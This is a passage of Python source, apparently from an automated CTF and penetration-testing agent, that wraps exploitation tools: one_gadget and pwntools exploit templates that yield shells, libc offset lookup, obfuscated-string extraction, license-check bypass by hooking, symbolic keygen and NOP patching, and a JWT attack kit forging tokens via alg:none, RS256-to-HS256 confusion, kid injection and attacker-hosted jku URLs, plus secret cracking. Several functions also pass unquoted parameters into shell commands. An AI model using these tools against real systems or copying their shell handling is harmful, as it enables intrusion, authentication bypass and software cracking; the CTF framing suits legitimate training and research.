        if not target_url: return "Provide target_url="
        return (f"Bit-level timing oracle: send characters from charset one at a time\n"
                f"and measure response time per position.\n"
                f"Use operation=timing_attack with samples=10+ for statistical significance.\n"
                f"Target: {target_url}  Param: {param}\n"
                f"Charset: {charset}")

    return "Operations: timing_attack, analyze_timings, bit_leak_extract"


def tool_one_gadget(libc_path: str = "", operation: str = "find",
                    leak_addr: str = "", leak_symbol: str = "puts",
                    constraints: dict = None) -> str:
    """Wrapper around one_gadget gem (github.com/david942j/one_gadget).
    Finds single-gadget RCE addresses in libc that give a shell when register
    constraints are met.
    Ops: find (list all gadgets + constraints), best (highest probability gadget),
    find_with_leak (resolve gadgets to absolute addresses given a libc leak),
    check_constraints (verify which gadgets are usable given register state)."""

    sp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""

    if operation in ("find", "best"):
        if not sp: return "Provide libc_path="
        out = _shell(f"one_gadget '{sp}' 2>&1", timeout=20)
        if "not found" in out or "command not found" in out:
            # Fallback: use ROPgadget to find execve gadgets
            out2 = _shell(f"ROPgadget --binary '{sp}' --rop 2>/dev/null | grep -E 'execve|/bin/sh' | head -20", timeout=20)
            return (f"one_gadget not installed. Install: gem install one_gadget\n"
                    f"ROPgadget fallback (execve patterns):\n{out2}")
        if operation == "best":
            lines = [l for l in out.splitlines() if l.startswith("0x")]
            return lines[0] if lines else out
        return out

    if operation == "find_with_leak":
        if not leak_addr or not sp:
            return "Provide libc_path= and leak_addr= (hex address of known symbol)"
        code = f"""
import subprocess, re
libc_path = {repr(sp)}
leak = {int(leak_addr, 16)}
symbol = {repr(leak_symbol)}

# Get symbol offset in libc
r = subprocess.run(['nm', '-D', libc_path], capture_output=True, text=True, timeout=10)
sym_offset = None
for line in r.stdout.splitlines():
    if f' {{symbol}}' in line or f'_{{symbol}}' in line:
        parts = line.split()
        if parts[0]:
            try:
                sym_offset = int(parts[0], 16)
                break
            except: pass

if sym_offset is None:
    print(f'Symbol {{symbol}} not found in {{libc_path}}')
else:
    libc_base = leak - sym_offset
    print(f'libc base: {{hex(libc_base)}}')
    
    # Get one_gadgets
    r2 = subprocess.run(['one_gadget', libc_path], capture_output=True, text=True, timeout=20)
    if r2.returncode == 0:
        for line in r2.stdout.splitlines():
            if line.startswith('0x'):
                off = int(line.split()[0], 16)
                abs_addr = libc_base + off
                rest = ' '.join(line.split()[1:])
                print(f'{{hex(abs_addr)}} (offset {{hex(off)}}) {{rest}}')
    else:
        print('one_gadget not installed. Install: gem install one_gadget')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "check_constraints":
        if not sp: return "Provide libc_path="
        cs = constraints or {}
        out = _shell(f"one_gadget '{sp}' --constraints '{' '.join(f'{k}=={v}' for k,v in cs.items())}' 2>&1", timeout=20)
        return out

    return "Operations: find, best, find_with_leak, check_constraints"


def tool_pwn_template(binary_path: str = "", host: str = "", port: int = 0,
                      operation: str = "generate", vuln_type: str = "auto",
                      libc_path: str = "") -> str:
    """Exploit template generator wrapping pwninit + pwntools.
    Ops: generate (full exploit template from binary analysis),
    stack_template (ret2win/rop scaffold), heap_template (heap exploit scaffold),
    rop_template (full ROP chain with libc leak scaffold),
    pwninit (run pwninit to patch binary + generate template file)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""
    lp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""

    if operation == "pwninit":
        if not sp: return "Provide binary_path="
        result = _shell(f"cd '{os.path.dirname(sp)}' && pwninit --binary '{sp}'" +
                       (f" --libc '{lp}'" if lp else "") + " 2>&1", timeout=30)
        if "not found" in result:
            return "pwninit not installed. Install: cargo install pwninit\nOr: https://github.com/io12/pwninit"
        return result

    if operation in ("generate", "stack_template", "heap_template", "rop_template"):
        # Get checksec info to inform template
        checksec = _shell(f"checksec --file='{sp}' 2>/dev/null || checksec '{sp}' 2>/dev/null", timeout=10) if sp else ""
        arch = "amd64"
        if sp:
            file_out = _shell(f"file '{sp}'", timeout=5)
            if "32-bit" in file_out or "i386" in file_out: arch = "i386"
            if "aarch64" in file_out: arch = "aarch64"

        host_line = f"HOST, PORT = {repr(host)}, {port}" if host and port else "HOST, PORT = 'challenge.ctf.com', 1337"
        conn_line = "io = remote(HOST, PORT)" if host and port else f"io = process({repr(sp) if sp else repr('./vuln')})"
        libc_line = f"libc = ELF({repr(lp)}, checksec=False)" if lp else "# libc = ELF('./libc.so.6', checksec=False)"

        if vuln_type == "auto":
            if "stack" in operation or checksec:
                vuln_type = "heap" if "heap" in operation else "stack"

        if vuln_type == "heap" or operation == "heap_template":
            template = f'''#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF({repr(sp) if sp else repr('./vuln')}, checksec=False)
context.arch = {repr(arch)}
{libc_line}

{host_line}

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

gs = """
set context-output /dev/null
heap
bins
"""

def alloc(size, data=b"A"):
    io.sendlineafter(b"choice", b"1")
    io.sendlineafter(b"size", str(size).encode())
    io.sendlineafter(b"data", data)

def free(idx):
    io.sendlineafter(b"choice", b"2")
    io.sendlineafter(b"index", str(idx).encode())

def show(idx):
    io.sendlineafter(b"choice", b"3")
    io.sendlineafter(b"index", str(idx).encode())
    return io.recvline()

io = start()
if args.GDB:
    gdb.attach(io, gs)

# === EXPLOIT HERE ===
# Step 1: Leak heap/libc address
# Step 2: Poison tcache/fastbin
# Step 3: Allocate to target (e.g. __free_hook, __malloc_hook)
# Step 4: Write shellcode or system address

io.interactive()
'''
        else:  # stack / rop
            template = f'''#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF({repr(sp) if sp else repr('./vuln')}, checksec=False)
context.arch = {repr(arch)}
{libc_line}

{host_line}

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

io = start()

# === OFFSET ===
# Find with: cyclic(200), examine crash EIP/RIP
# or: tool_binary_analysis(path, "pwndbg_cyclic", "200")
OFFSET = 0  # <-- fill in

# === LEAK (if PIE/ASLR) ===
# leak = u64(io.recvuntil(b"\\n")[:-1].ljust(8, b"\\x00"))
# elf.address = leak - elf.symbols["main"]

# === LIBC LEAK (if needed) ===
# Send ROP to print GOT entry, recv leak, calculate base
# libc.address = leaked_puts - libc.symbols["puts"]
# one_gadget = libc.address + 0xXXXXX  # from tool_one_gadget

# === PAYLOAD ===
payload = flat({{
    OFFSET: [
        # rop gadgets here
    ]
}})

io.sendlineafter(b"input", payload)
io.interactive()
'''

        log("sys", f"[pwn_template] Generated {arch} {vuln_type} template ({len(template)} chars)", "dim")
        return template

    return "Operations: generate, stack_template, heap_template, rop_template, pwninit"


def tool_heap_visualize(operation: str = "parse_state", gdb_output: str = "",
                        binary_path: str = "", pid: int = 0) -> str:
    """Parse and visualize pwndbg/GDB heap state.
    Ops: parse_state (parse raw pwndbg 'heap'/'bins'/'vis_heap_chunks' output into structured data),
    live (attach to running process and dump heap via pwndbg),
    find_overlap (check if two chunks overlap — common in heap overflow challenges),
    tcache_status (parse tcache bins and counts),
    check_double_free (scan for same chunk address in multiple bins)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""

    if operation == "live":
        target = f"--pid {pid}" if pid else (f"'{sp}'" if sp else "")
        if not target: return "Provide binary_path= or pid="
        script = "set pagination off\nheap\nbins\nvis_heap_chunks\ntcachebins\nquit"
        tmp = f"/tmp/heap_viz_{int(time.time())}.gdb"
        with open(tmp, "w") as f: f.write(script)
        out = _shell(f"gdb -batch -x '{tmp}' {target} 2>&1", timeout=30)
        try: os.remove(tmp)
        except: pass
        return out

    if operation in ("parse_state", "find_overlap", "tcache_status", "check_double_free"):
        text = gdb_output or ""
        if not text and sp:
            # Run live
            script = "set pagination off\nheap\nbins\ntcachebins\nvis_heap_chunks 20\nquit"
            tmp = f"/tmp/heap_gdb_{int(time.time())}.gdb"
            with open(tmp, "w") as f: f.write(script)
            text = _shell(f"gdb -batch -x '{tmp}' '{sp}' 2>&1", timeout=30)
            try: os.remove(tmp)
            except: pass

        code = f"""
import re
text = {repr(text[:8000])}

# Parse chunk addresses from vis_heap_chunks
chunks = re.findall(r'0x[0-9a-f]{{8,16}}', text)
unique_chunks = list(dict.fromkeys(chunks))

# Look for tcache/fastbin entries
tcache = re.findall(r'tcachebins.*?(?=fastbins|$)', text, re.DOTALL)
fastbin = re.findall(r'fastbins.*?(?=smallbins|$)', text, re.DOTALL)

print("=== Heap Summary ===")
print(f"Addresses found: {{len(unique_chunks)}}")
print("First 10:", unique_chunks[:10])

if '{operation}' == 'tcache_status':
    print("\\n=== Tcache Bins ===")
    for line in text.splitlines():
        if 'tcache' in line.lower() or 'count' in line.lower():
            print(line)

if '{operation}' == 'find_overlap':
    print("\\n=== Overlap Check ===")
    # Look for same address in multiple bins
    all_addrs = re.findall(r'(0x[0-9a-f]{{8,16}})', text)
    from collections import Counter
    dupes = {{addr: cnt for addr, cnt in Counter(all_addrs).items() if cnt > 1}}
    if dupes:
        for addr, cnt in dupes.items():
            print(f'  [!] {{addr}} appears {{cnt}} times — possible overlap/double-free')
    else:
        print('  No obvious overlaps detected')

if '{operation}' == 'check_double_free':
    print("\\n=== Double-Free Check ===")
    all_addrs = re.findall(r'(0x[0-9a-f]{{8,16}})', text)
    from collections import Counter
    dupes = {{addr: cnt for addr, cnt in Counter(all_addrs).items() if cnt > 2}}
    for addr, cnt in dupes.items():
        print(f'  [POSSIBLE DOUBLE-FREE] {{addr}} x{{cnt}}')
    if not dupes:
        print('  No double-free detected')

print("\\nRaw output preview:")
print(text[:500])
"""
        return tool_execute_python(code, timeout=15)

    return "Operations: live, parse_state, find_overlap, tcache_status, check_double_free"


def tool_libc_database(operation: str = "search", leak_addr: str = "",
                       symbol: str = "puts", extra_symbols: dict = None,
                       build_id: str = "", arch: str = "amd64") -> str:
    """Extended libc lookup using libc.rip API + pwntools LibcSearcher + local database.
    Ops: search (find libc from leaked address + symbol name via libc.rip),
    identify (narrow down libc with multiple leak+symbol pairs),
    download (download matching libc .so from libc.rip),
    offsets (print all useful symbol offsets for a known libc build),
    one_gadgets (get one_gadget offsets for a libc build)."""

    base_url = "https://libc.rip/api"

    if operation == "search":
        if not leak_addr or not symbol:
            return "Provide leak_addr= (hex) and symbol= (e.g. 'puts')"
        code = f"""
import requests, json
url = 'https://libc.rip/api/find'
# Last 3 nibbles of address are the offset within a page
leak = {int(leak_addr, 16)}
last12 = hex(leak)[-3:]  # last 12 bits
data = {{'symbols': {{'{symbol}': last12}}}}
try:
    r = requests.post(url, json=data, timeout=10)
    results = r.json()
    if not results:
        print('No matching libc found for this leak')
    else:
        print(f'Found {{len(results)}} matching libc build(s):')
        for res in results[:5]:
            print(f"  ID: {{res.get('id','?')}}  symbols: {{list(res.get('symbols',{{}}).keys())[:5]}}")
            # Compute useful offsets
            for sym, off in res.get('symbols',{{}}).items():
                if sym in ('puts','system','__libc_start_main','str_bin_sh','one_gadget'):
                    abs_addr = {int(leak_addr,16)} - int(res['symbols'].get('{symbol}','0'), 16) + int(off, 16)
                    print(f'    {{sym}}: {{hex(int(off,16))}} → {{hex(abs_addr)}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "identify":
        syms = extra_symbols or {}
        if not syms: return "Provide extra_symbols={'puts': '0x...', 'printf': '0x...'}"
        code = f"""
import requests
last12 = {{k: hex(v)[-3:] if isinstance(v,int) else v[-3:] for k,v in {repr(syms)}.items()}}
r = requests.post('https://libc.rip/api/find', json={{'symbols': last12}}, timeout=10)
results = r.json()
if not results:
    print('No match found')
else:
    for res in results[:3]:
        print(f"ID: {{res.get('id')}}  arch: {{res.get('arch')}}  distro: {{res.get('distro')}}")
        for sym, off in res.get('symbols',{{}}).items():
            print(f'  {{sym}}: {{off}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "download":
        if not build_id: return "Provide build_id= from search results"
        out_path = f"/tmp/libc_{build_id}.so"
        result = _shell(f"wget -q 'https://libc.rip/download/{build_id}' -O '{out_path}' && echo 'Downloaded: {out_path}'", timeout=30)
        return result

    if operation == "offsets":
        if not build_id and not leak_addr: return "Provide build_id= or leak_addr+symbol="
        code = f"""
import requests
bid = {repr(build_id)}
r = requests.get(f'https://libc.rip/api/libc/{{bid}}', timeout=10)
data = r.json()
useful = ['puts','gets','system','execve','__libc_start_main','malloc','free',
          'str_bin_sh','__free_hook','__malloc_hook','environ','printf']
print(f"Libc: {{data.get('id')}}  buildid: {{data.get('buildid','?')[:16]}}")
syms = data.get('symbols', {{}})
for sym in useful:
    if sym in syms:
        print(f'  {{sym}}: {{syms[sym]}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "one_gadgets":
        if not build_id: return "Provide build_id= — download libc first then use tool_one_gadget"
        out_path = f"/tmp/libc_{build_id}.so"
        _shell(f"wget -q 'https://libc.rip/download/{build_id}' -O '{out_path}'", timeout=30)
        return tool_one_gadget(out_path, "find")

    return "Operations: search, identify, download, offsets, one_gadgets"


def tool_string_decryptor(binary_path: str = "", operation: str = "floss",
                           key: str = "", algorithm: str = "auto",
                           decompiled_code: str = "") -> str:
    """Obfuscated string extractor wrapping FLOSS (Mandiant/flare-floss).
    Ops: floss (run FLOSS to extract all obfuscated strings automatically),
    xor_scan (scan binary for XOR-encrypted string patterns + brute key),
    stack_strings (extract stack-allocated strings via FLOSS --only-stack-strings),
    tight_loops (find tight decryption loops — common in malware/CTF obfuscation),
    decode_with_key (given key + algorithm, decrypt all strings matching pattern)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""

    if operation in ("floss", "stack_strings", "tight_loops"):
        if not sp: return "Provide binary_path="
        flag_filter = "| grep -iE 'picoCTF|flag{|ctf{|key|password|secret' 2>/dev/null || true"
        mode = "--only-stack-strings" if operation == "stack_strings" else \
               "--only-tight-loops" if operation == "tight_loops" else ""
        result = _shell(f"floss {mode} '{sp}' 2>&1 | head -100", timeout=60)
        if "not found" in result or "command not found" in result:
            result = _shell(f"python3 -m floss {mode} '{sp}' 2>&1 | head -100", timeout=60)
        if "not found" in result or "command not found" in result:
            return ("FLOSS not installed. Install: pip install flare-floss\n"
                    "Fallback: using strings + XOR scan\n\n" +
                    _shell(f"strings '{sp}' | grep -iE '.{{6,}}' | head -50", timeout=10))
        return result

    if operation == "xor_scan":
        if not sp: return "Provide binary_path="
        code = f"""
import subprocess, itertools
sp = {repr(sp)}

# Read binary
with open(sp, 'rb') as f: data = f.read()

# Try all single-byte XOR keys
flag_patterns = [b'picoCTF', b'flag{{', b'CTF{{', b'FLAG']
found = []
for key_byte in range(256):
    decrypted = bytes(b ^ key_byte for b in data)
    for pat in flag_patterns:
        if pat in decrypted:
            idx = decrypted.index(pat)
            snippet = decrypted[max(0,idx-5):idx+60]
            printable = bytes(b if 32<=b<=126 else ord('.') for b in snippet)
            found.append(f'[KEY=0x{{key_byte:02x}}] {{printable.decode()}}')

if found:
    print('Flag pattern found with XOR key!')
    for f in found:
        print(f'  {{f}}')
else:
    # Try multi-byte XOR with common lengths
    print('No single-byte XOR hit. Trying common 2-4 byte keys...')
    r = subprocess.run(['strings', sp], capture_output=True, text=True, timeout=10)
    printable_strings = [s for s in r.stdout.splitlines() if len(s) > 8]
    print(f'Found {{len(printable_strings)}} strings. Top suspicious:')
    for s in printable_strings[:20]:
        if any(ord(c)>127 or c=='\\x00' for c in s[:3]):
            print(f'  {{repr(s)}}')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "decode_with_key":
        if not sp or not key: return "Provide binary_path= and key= (hex bytes e.g. 'deadbeef')"
        code = f"""
with open({repr(sp)}, 'rb') as f: data = f.read()
key_bytes = bytes.fromhex({repr(key.replace(' ','').replace('0x',''))})
kl = len(key_bytes)
decrypted = bytes(data[i] ^ key_bytes[i % kl] for i in range(len(data)))

# Extract printable strings from decrypted
import re
strings = re.findall(rb'[ -~]{{6,}}', decrypted)
print(f'Decrypted strings (key={{repr(key_bytes.hex())}}):')
for s in strings[:40]:
    print(f'  {{s.decode(errors="replace")}}')
"""
        return tool_execute_python(code, timeout=15)

    return "Operations: floss, xor_scan, stack_strings, tight_loops, decode_with_key"


def tool_license_check(binary_path: str = "", operation: str = "hook_comparisons",
                        username: str = "user", input_value: str = "",
                        timeout: int = 30) -> str:
    """License/serial check extractor using angr symbolic execution + frida hooks.
    Ops: hook_comparisons (frida-intercept strcmp/memcmp/strncmp, print comparisons),
    angr_keygen (angr symbolic execution to find valid input/serial),
    patch_check (NOP out validation with binary_patch — makes any input valid),
    frida_hook (custom frida script to dump function args at interesting calls)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""
    if not sp: return "Provide binary_path="

    if operation == "hook_comparisons":
        # Frida intercept script
        frida_script = """
Interceptor.attach(Module.getExportByName(null, 'strcmp'), {
    onEnter(args) {
        const s1 = args[0].readUtf8String();
        const s2 = args[1].readUtf8String();
        console.log('[strcmp] ' + JSON.stringify(s1) + ' vs ' + JSON.stringify(s2));
    }
});
Interceptor.attach(Module.getExportByName(null, 'strncmp'), {
    onEnter(args) {
        const s1 = args[0].readUtf8String();
        const s2 = args[1].readUtf8String();
        console.log('[strncmp] ' + JSON.stringify(s1) + ' vs ' + JSON.stringify(s2));
    }
});
Interceptor.attach(Module.getExportByName(null, 'memcmp'), {
    onEnter(args) {
        const n = args[2].toInt32();
        const b1 = args[0].readByteArray(n);
        const b2 = args[1].readByteArray(n);
        console.log('[memcmp] ' + Array.from(new Uint8Array(b1)).map(x=>x.toString(16).padStart(2,'0')).join('') +
                    ' vs '     + Array.from(new Uint8Array(b2)).map(x=>x.toString(16).padStart(2,'0')).join(''));
    }
});
"""
        tmp_script = f"/tmp/frida_hook_{int(time.time())}.js"
        with open(tmp_script, "w") as f: f.write(frida_script)
        cmd = (f"echo {repr(input_value)} | frida -l '{tmp_script}' "
               f"--no-pause -f '{sp}' 2>&1 | grep -E 'strcmp|strncmp|memcmp' | head -30")
        result = _shell(cmd, timeout=timeout)
        try: os.remove(tmp_script)
        except: pass
        if "not found" in result or "Unable to find" in result:
            # Fallback: GDB hooks
            gdb_script = f"""set pagination off
set confirm off
break strcmp
commands 1
  printf "strcmp: %s vs %s\\n", (char*)$rdi, (char*)$rsi
  continue
end
break strncmp
commands 2
  printf "strncmp: %s vs %s\\n", (char*)$rdi, (char*)$rsi
  continue
end
run <<< {repr(input_value)}
quit"""
            tmp_gdb = f"/tmp/gdb_hook_{int(time.time())}.gdb"
            with open(tmp_gdb, "w") as f: f.write(gdb_script)
            result = _shell(f"timeout {timeout} gdb -batch -x '{tmp_gdb}' '{sp}' 2>&1 | grep -E 'strcmp|strncmp' | head -20", timeout=timeout+5)
            try: os.remove(tmp_gdb)
            except: pass
        return result

    if operation == "angr_keygen":
        code = f"""
import angr, claripy, sys
proj = angr.Project({repr(sp)}, load_options={{'auto_load_libs': False}})
state = proj.factory.entry_state(stdin=angr.SimFileStream(name='stdin', size=64))
simgr = proj.factory.simulation_manager(state)

# Look for success/failure strings
simgr.explore(
    find=lambda s: b'Correct' in s.posix.dumps(1) or b'Valid' in s.posix.dumps(1) or b'picoCTF' in s.posix.dumps(1),
    avoid=lambda s: b'Wrong' in s.posix.dumps(1) or b'Invalid' in s.posix.dumps(1) or b'Incorrect' in s.posix.dumps(1),
)
if simgr.found:
    s = simgr.found[0]
    stdin_val = s.posix.dumps(0)
    stdout_val = s.posix.dumps(1)
    print(f'[+] Found valid input: {{repr(stdin_val)}}')
    print(f'    stdout: {{repr(stdout_val[:200])}}')
else:
    print('[-] No path found — try adjusting find/avoid conditions')
    print(f'    deadended: {{len(simgr.deadended)}}, active: {{len(simgr.active)}}')
"""
        return tool_execute_python(code, timeout=120)

    if operation == "patch_check":
        # Find the comparison and NOP it — delegate to binary_patch
        result = tool_binary_analysis(sp, "disassemble_func", "main")
        return (f"Analysis of {sp}:\n{result[:2000]}\n\n"
                f"Use tool_binary_patch('{sp}', 'flip_jump', ...) to NOP out the check\n"
                f"or tool_binary_patch('{sp}', 'patch_ret', ...) to make function always return 1")

    if operation == "frida_hook":
        frida_script = f"""
// Generic hook — modify target address as needed
const target = Process.enumerateModulesSync()[0];
console.log('[*] Target module:', target.name, target.base);
Process.enumerateExportsSync().filter(e => e.type === 'function').slice(0,5).forEach(e => {{
    console.log('[export]', e.name, e.address);
}});
"""
        tmp_script = f"/tmp/frida_generic_{int(time.time())}.js"
        with open(tmp_script, "w") as f: f.write(frida_script)
        result = _shell(f"frida -l '{tmp_script}' --no-pause -f '{sp}' 2>&1 | head -30", timeout=15)
        try: os.remove(tmp_script)
        except: pass
        return result

    return "Operations: hook_comparisons, angr_keygen, patch_check, frida_hook"


def tool_proto_decode(operation: str = "decode", data: str = "",
                       binary_path: str = "", output_format: str = "json") -> str:
    """Protobuf decoder using blackboxprotobuf + protoc --decode_raw.
    Ops: decode (decode raw protobuf hex/bytes without .proto schema),
    schema_guess (guess field types and output an approximate .proto schema),
    encode (encode a dict back to protobuf bytes),
    from_file (decode a binary file as protobuf),
    decode_raw (shell to protoc --decode_raw for quick inspection)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""

    if operation == "decode_raw":
        target = f"cat '{sp}'" if sp else f"echo -n '{data}' | xxd -r -p"
        result = _shell(f"{target} | protoc --decode_raw 2>&1", timeout=10)
        if "not found" in result:
            return "protoc not installed. Install: apt install protobuf-compiler"
        return result

    if operation in ("decode", "schema_guess", "encode"):
        code = f"""
try:
    import blackboxprotobuf as bbpb
    import json, binascii

    data_str = {repr(data)}
    binary_path = {repr(sp)}

    if binary_path:
        with open(binary_path, 'rb') as f:
            raw = f.read()
    elif data_str:
        # Try hex decode first, then base64, then raw
        try:
            raw = binascii.unhexlify(data_str.replace(' ','').replace(':',''))
        except:
            import base64
            try: raw = base64.b64decode(data_str)
            except: raw = data_str.encode()
    else:
        print('Provide data= (hex/base64) or binary_path=')
        exit()

    if '{operation}' == 'encode':
        # Treat data_str as JSON dict to encode
        d = json.loads(data_str)
        encoded = bbpb.encode_message(d)
        print(f'Encoded hex: {{encoded.hex()}}')
        print(f'Encoded b64: {{__import__("base64").b64encode(encoded).decode()}}')
    else:
        message, typedef = bbpb.decode_message(raw)
        print(f'Decoded message:')
        print(json.dumps(message, indent=2, default=str))
        if '{operation}' == 'schema_guess':
            print(f'\\nInferred typedef (approximate .proto):')
            print(json.dumps(typedef, indent=2, default=str))

except ImportError:
    print('blackboxprotobuf not installed. Install: pip install blackboxprotobuf')
    # Fallback: protoc --decode_raw
    import subprocess
    r = subprocess.run(['protoc','--decode_raw'], input={repr(data)}.encode() if {repr(data)} else open({repr(sp or '/dev/null')},'rb').read(),
                       capture_output=True, timeout=10)
    print(r.stdout.decode(errors='replace') or r.stderr.decode(errors='replace'))
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "from_file":
        return tool_proto_decode("decode", binary_path=sp)

    return "Operations: decode, schema_guess, encode, from_file, decode_raw"


def tool_jwt_forge(token: str = "", operation: str = "analyze",
                   pubkey_path: str = "", secret: str = "",
                   attacker_url: str = "", kid: str = "/dev/null",
                   payload_overrides: dict = None,
                   wordlist: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """JWT attack toolkit wrapping jwt_tool (github.com/ticarpi/jwt_tool).
    Ops: analyze (decode + show header/payload/signature),
    alg_none (forge with alg:none — no signature needed),
    rs256_hs256 (RS256 to HS256 confusion — sign with public key as HMAC secret),
    kid_injection (kid header path traversal to /dev/null or known file),
    jku_redirect (jku/x5u header pointing to attacker-controlled JWKS),
    crack (brute-force HS256 secret with wordlist),
    forge (create new token with custom payload + secret)."""

    def _jwt_tool(args):
        for cmd in ["jwt_tool", "python3 /opt/jwt_tool/jwt_tool.py",
                    "python3 ~/jwt_tool/jwt_tool.py"]:
            result = _shell(f"{cmd} {args} 2>&1", timeout=30)
            if "not found" not in result and "No such" not in result:
                return result
        return None

    if operation == "analyze":
        if not token: return "Provide token="
        # Try jwt_tool first, then PyJWT
        r = _jwt_tool(f"'{token}' -d")
        if r: return r
        code = f"""
import base64, json
tok = {repr(token)}
parts = tok.split('.')
if len(parts) < 2:
    print('Invalid JWT format')
else:
    def b64d(s):
        s += '=='*((4-len(s)%4)%4)
        return base64.urlsafe_b64decode(s)
    header  = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    print('Header:', json.dumps(header, indent=2))
    print('Payload:', json.dumps(payload, indent=2))
    print('Signature (b64):', parts[2][:40]+'...' if len(parts)>2 else 'none')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "alg_none":
        if not token: return "Provide token="
        r = _jwt_tool(f"'{token}' -X a")
        if r: return r
        code = f"""
import base64, json, re
tok = {repr(token)}
parts = tok.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload_bytes = base64.urlsafe_b64decode(parts[1]+'==')
payload = json.loads(payload_bytes)

# Apply overrides
overrides = {repr(payload_overrides or {{}})}
payload.update(overrides)

# Forge with alg:none
header['alg'] = 'none'
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
forged = f'{{h}}.{{p}}.'
print(f'Forged (alg:none): {{forged}}')
# Also try with empty signature
print(f'With empty sig: {{forged}}')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "rs256_hs256":
        if not token or not pubkey_path: return "Provide token= and pubkey_path="
        r = _jwt_tool(f"'{token}' -X k -pk '{pubkey_path}'")
        if r: return r
        code = f"""
import base64, json
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256

tok = {repr(token)}
parts = tok.split('.')
with open({repr(pubkey_path)}, 'rb') as f: pubkey = f.read()

# Change alg to HS256
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
overrides = {repr(payload_overrides or {{}})}
payload.update(overrides)
header['alg'] = 'HS256'

h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
msg = f'{{h}}.{{p}}'.encode()
sig = HMAC.new(pubkey, msg, SHA256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'Forged RS256→HS256: {{h}}.{{p}}.{{sig_b64}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "kid_injection":
        if not token: return "Provide token="
        r = _jwt_tool(f"'{token}' -I -hc kid -hv '{kid}'")
        if r: return r
        code = f"""
import base64, json, hmac, hashlib
tok = {repr(token)}
kid_val = {repr(kid)}
parts = tok.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
overrides = {repr(payload_overrides or {{}})}
payload.update(overrides)
header['kid'] = kid_val
# Sign with empty string (for /dev/null kid) or key=''
secret = b''
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
msg = f'{{h}}.{{p}}'.encode()
sig = hmac.new(secret, msg, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'kid injection ({repr(kid_val)}): {{h}}.{{p}}.{{sig_b64}}')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "jku_redirect":
        if not token or not attacker_url: return "Provide token= and attacker_url= (JWKS endpoint)"
        r = _jwt_tool(f"'{token}' -X s -ju '{attacker_url}'")
        if r: return r
        return (f"jwt_tool not installed. Install: pip install jwt-tool\n"
                f"Manual: modify header to add jku={repr(attacker_url)} and host JWKS at that URL")

    if operation == "crack":
        if not token: return "Provide token="
        r = _jwt_tool(f"'{token}' -C -d '{wordlist}'")
        if r: return r
        code = f"""
import base64, json, hmac, hashlib
tok = {repr(token)}
wl = {repr(wordlist)}
parts = tok.split('.')
msg = f'{{parts[0]}}.{{parts[1]}}'.encode()
target_sig = base64.urlsafe_b64decode(parts[2]+'==')
print(f'Cracking HS256 with {{wl}}...')
tried = 0
try:
    with open(wl, 'r', errors='replace') as f:
        for line in f:
            secret = line.strip().encode()
            sig = hmac.new(secret, msg, hashlib.sha256).digest()
            if sig == target_sig:
                print(f'[+] SECRET FOUND: {{repr(line.strip())}}')
                break
            tried += 1
            if tried % 100000 == 0:
                print(f'  {{tried}} tried...')
    else:
        print(f'Secret not found in wordlist ({{tried}} tried)')
except FileNotFoundError:
    print(f'Wordlist not found: {{wl}}')
"""
        return tool_execute_python(code, timeout=120)

    if operation == "forge":
        if not token: return "Provide token="
        overrides = payload_overrides or {}
        code = f"""
import base64, json, hmac, hashlib
tok = {repr(token)}
secret = {repr(secret)}.encode()
overrides = {repr(overrides)}
parts = tok.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
payload.update(overrides)
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
msg = f'{{h}}.{{p}}'.encode()
sig = hmac.new(secret, msg, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
